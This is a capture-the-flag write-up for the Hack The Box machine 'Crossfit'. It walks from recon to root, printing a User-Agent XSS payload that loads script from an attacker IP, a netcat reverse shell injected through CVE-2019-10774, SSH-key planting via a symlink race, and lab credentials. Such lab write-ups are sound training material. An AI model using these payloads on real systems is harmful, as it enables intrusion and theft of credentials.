# Crossfit - Insane

# Initial recon
After the nmap scan (TCP & UDP) we get only three ports: 21 (FTP), 22 (SSH) and 80 (web)

# Trying the FTP (21)
From the scan we get hit with the idea that FTP has an SSL ceritificate. At first, I tried to login anonymously but without any luck. Than, I found this [article](https://book.hacktricks.xyz/pentesting/pentesting-ftp) from which I tried to grab the banner using `openssl s_client -connect crossfit.htb:21 -starttls ftp`. This leaked a web virtual host `gym-club.crossfit.htb`, so we finally get an atttack surface.

# Looking int the gym-club.crossfit.htb vhost (80)
At a first glance we don't see anything that's usefull because it seems to be a static generated template from ColorLib. When we dive deeper we actually have 3 pages from which we can input: `contact.php`, `jointheclub.php` and `blog-single.php`. I tried to look for a sqli attack in all but none worked. After that I tried to look for an XSS attack. The `contact.php` and `jointheclub.php` didn't respond with anything but on `blog-single.php` I got an alert: `XSS attempt detected. A security report containing your IP address and browser information will be generated and our admin team will be immediately notified.`.

This is really interesting... a report that contains our IP and User-Agent will be overviewed by an `admin`. Because IP can't be manipulated, I tried to change the `User-Agent`, and after first try I got the ping back, requesting for `leak.js`. The command that I used was `curl -X POST --data "name=test&email=test%40test.com&phone=test&message=<script>alert(1)</script>&submit=submit" --url http://gym-club.crossfit.htb/blog-single.php -H 'User-Agent: <script>eval(atob("ZG9jdW1lbnQud3JpdGUoJzxzY3JpcHQgc3JjPWh0dHA6Ly8xMC4xMC4xNC44L2xlYWsuanM+PC9zY3JpcHQ+Jyk7Cg=="))</script>'` 

```javascript
document.write('<script src="http://10.10.14.xx/leak.js"></script>'); //read & execute the leak.js on the remote.
<script>eval(atob("ZG9jdW1lbnQud3JpdGUoJzxzY3JpcHQgc3JjPWh0dHA6Ly8xMC4xMC4xNC54eC9sZWFrLmpzPjwvc2NyaXB0PicpOw=="))</script> //decodes the base64 and executes it
```
Have a stable XSS we can read the files as `localhost` and because of this we need fuzz the subdomains that are available only on localhost using `wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.crossfit.htb" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://gym-club.crossfit.htb/` and we end with `ftp.crossfit.htb`.


# Creating an account on ftp.crossfit.htb (127.0.0.1 only)
Looking at this virtualhost it seems that it's somehow linked with the vsftpd service, so if we create an account on the web we will be able to access the FTP. For this we must do a POST request to the `http://ftp.crossfit.htb/accounts/`. The idea behind this is: You need to grab the CSRF token from `/accounts/create`, than make a POST to `/accounts` and than get back the responses. To get this done I used this (stackoverflow)[https://stackoverflow.com/questions/48659892/how-to-handle-csrf-token-using-xmlhttprequest] code. Note that if you don't add `tryout.withCredentials = true;` you will always get 419. You can found the whole code inside `leak.js -> createAccount()`. 
Now that we have account I tried to login using `sftp` but it didn't work so I installed Filezilla and started digging. 

# Getting the foothold
Being the ftp we have 4 directories that seems to map the virtualhosts. The only one in which we have write access is `development-test` so we can drop a shell in there. But unfortunately, as like as `ftp` we can ping it only from localhost. So we again need to use the `leak.js` file. I created the function `readPath()` to make it easier to trigger the shell. Now if we've done everything right we got a shell as `www-data`. Let's upgrade it to tty using `python3  -c 'import pty; pty.spawn("/bin/bash")'` and run `linpeas.sh`. At the very end we get a line that says `/etc/ansible/playbooks/adduser_hank.yml:$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/`. 
I put the hash into a filee and fired up john using `john -w=/usr/share/wordlists/rockyou.txt hash` and we endup with  the password `powerpuffgirls`.
Now we can login using `ssh hank@crossfit.htb` and got the user.txt

# Privesc from hank to isaac
Running again the `linpeas.sh` we get that we can read all the files from the `/etc/pam.d/` directory and also from `/home/isaac/send_updates`. 
First I checked the `send_updates.php` under the `/home/isaac/send_updates`. Here we can find a php code that uses a composer module called `mikehaertl\shellcommand`. This has (CVE-2019-10774)[https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426] assigned to it, and the proof of concept can be found in the repository of the module, under the (issues)[https://github.com/mikehaertl/php-shellcommand/issues/44] section. The database credentials can be leaked from `/var/www/gym-club/db.php`. This is the command that I've used to inject into the database: `mysql -u crossfit -poeLoo~y2baeni crossfit -e 'INSERT INTO users (email) VALUES ("--header foo --wrong-argument || nc 10.10.14.x 9001 -e /bin/bash ||");'`.

To triger this exploit the `$msg_dir` must contain at least one file. Well here I've got blocked and rechecked the enum and that it clicked: I have read acess to `/etc/pam.d/`. Let's see what's in here. The `vsftpd` and `vsftpd.orig` are interesting. And I got the hit: `auth sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3` it leaked the `ftpadm` password. Going back to Filezilla and logging in as `ftpadm` I find a folder called `messages` and we hit it! Now I can upload a basic file and get the user `isaac` a reverse shell. To obtain stability I will inject ssh keys.
Now all I have to do is `ssh -i isaac isaac@crossfit.htb`.

# Privesc from isaac to root
This is one of the toughest steps on the whole box. At first I tried again to run `linpeas.sh` but it was useless. I than decided to run `pspy` but again nothing. Again I tried to run pspy but this time with `-f` to see if there is a silent crontab that only reads/writes files. And I get a hit at `/usr/bin/dbmsg`. This seems to be a custom binary (there is nothing on the web about it) so I downloaded it and started to reverse. It seems that `process_data` is a function that reads from `crossfit/messages` database, puts the content into a file under `/var/local/` and than archives it into `/var/backups/mariadb/comments.zip`. Well we have write access into `/var/local` so we can try to make a symlink from the file to `/root/.ssh/authorized_keys`.

In order to achieve this I first understood how the filenames are generated (rand() + message.id), how the content is generated `name, message, email` which means we can insert the key in two ways (ordered and with using null) and how to combine all this.
```sql
mysql -u crossfit -poeLoo~y2baeni crossfit -e "insert into messages (id, name, message, email) values (1, 'ssh-rsa', '<key>', 'root@kali')" #the ordered way
mysql -u crossfit -poeLoo~y2baeni crossfit -e "insert into messages (id, name, message, email) values (1,null, null '<key>')" #the null way
```
The code that handles the filename is 
```cpp
lVar3 = *local_38;
uVar2 = rand();
snprintf(local_c8,0x30,"%d%s",(ulong)uVar2,lVar3);
sVar5 = strlen(local_c8);
md5sum(local_c8,(int)sVar5,(long)local_f8);
snprintf(local_98,0x30,"%s%s","/var/local/",local_f8);
```
which can be beautified up to 
```cpp 
long message_id = 1340;
uint random_number = rand();
snprintf(name_unhashed,0x30,"%d%s",(ulong)random_number,message_id);
size_t length = strlen(name_unhashed);
md5sum(name_unhashed,(int)length,(long)hashed_name);
snprintf(full_path,0x30,"%s%s","/var/local/",hashed_name);
```
Now that we have this figured out, I wrote the `pwn.py` script and the `rand.cpp` which can be compiled using `gcc rand.cpp -o rand`. Now everything I needed to do was to run it a couple of minutes an than try to login using `ssh -i isaac root@crossfit.htb` and I pwned.

It's worth mentioning that root has it's own ssh key so I downloaded it and I get redundancy over root :) `ssh -i root.rsa root@crossfit.htb`

# Credentials 

- crossfit:oeLoo~y2baeni (database)
- hank:powerpuffgirls (first user)
- ftpadm:8W)}gpRJvAmnb (ftpadmin credentials)
- root:$6$PzTExBJPqcf0mEib$eAjSFvtsks6JD4AdX5Du/XW/WU0JIwX0jmUMryO24fnjG19GBnHr3BzZaFN4krvOrkh8BFL4FCjIrGvoKRVO50 (root hash)

# Virtual Hosts
ftp.crossfit.htb www.gym-club.crossfit.htb gym-club.crossfit.htb development-test.crossfit.htb